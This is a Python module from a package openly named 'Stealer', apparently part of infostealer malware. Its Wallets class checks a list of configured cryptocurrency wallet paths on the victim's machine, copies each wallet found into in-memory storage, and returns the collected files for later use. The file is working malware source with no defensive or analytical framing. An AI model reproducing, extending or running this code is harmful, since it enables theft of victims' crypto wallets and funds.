from os import path

from Stealer.helpers import MemoryStorage
from Stealer.helpers.config import WalletsConfig
from Stealer.helpers.dataclasses import Data


class Wallets:
    """
    Collects configs from the crypto wallets.
    """
    def __init__(self, folder: str):

        self.__folder = folder
        self.__config = WalletsConfig()
        self.__storage = MemoryStorage()

    def __get_wallets_files(self) -> None:
        """
        Collects configs from the crypto wallets.

        Parameters:
        - None.

        Returns:
        - None.
        """
        wallets = self.__config.WalletPaths

        for wallet in wallets:

            if not path.exists(wallet["path"]):
                print(f'[Wallets]: No {wallet["name"]} found')
                continue

            self.__storage.add_from_disk(wallet["path"], path.join(self.__folder, wallet["name"]))
            self.__storage.add_data("Wallets", wallet["name"])

    def run(self) -> Data:
        """
        Launches the crypto wallets collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__get_wallets_files()

            return self.__storage.get_data()

        except Exception as e:
            print(f"[Wallets]: {repr(e)}")
